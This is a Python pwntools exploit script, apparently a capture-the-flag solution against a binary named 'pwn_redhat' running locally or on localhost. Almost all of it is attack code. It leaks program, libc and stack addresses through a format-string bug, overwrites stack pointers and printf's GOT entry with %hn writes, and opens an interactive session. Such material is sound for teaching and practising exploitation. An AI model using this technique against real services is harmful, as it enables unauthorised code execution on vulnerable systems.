#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./pwn_redhat")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./pwn_redhat")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    #  DEBUG()
    info("leak address")
    io.sendlineafter(">>>", "%8$p..%9$p..%11$p..%25$p..")
    elf.address = int(io.recvuntil("..", drop = True), 16) - 0x13C0
    success("elf.address -> {:#x}".format(elf.address))
    libc.address = int(io.recvuntil("..", drop = True), 16) - 241 - libc.sym[u'__libc_start_main']
    success("libc.address -> {:#x}".format(libc.address))
    stack05 = int(io.recvuntil("..", drop = True), 16) 
    elf07 = stack05 - 0xc0
    success("elf07 -> {:#x}".format(elf07))
    success("stack05 -> {:#x}".format(stack05))
    stack13 = int(io.recvuntil("..", drop = True), 16)
    elf0a = stack13 - 0xb8
    success("elf0a -> {:#x}".format(elf0a))
    success("stack13 -> {:#x}".format(stack13))
    pause()

    #  DEBUG()
    info("overwrite stack to elf")
    payload = "%{}c%{}$hn".format(elf07 & 0xffff, 11)
    io.sendlineafter(">>>", payload)
    payload = "%{}c%{}$hn".format(elf0a & 0xffff, 25)
    io.sendlineafter(">>>", payload)

    DEBUG()
    info("overwrite elf to printf@got")
    payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x1f + 6)
    payload += "%{}c%{}$hhn".format(2, 0x21 + 6)
    io.sendlineafter(">>>", payload)


    io.interactive()
    io.close()



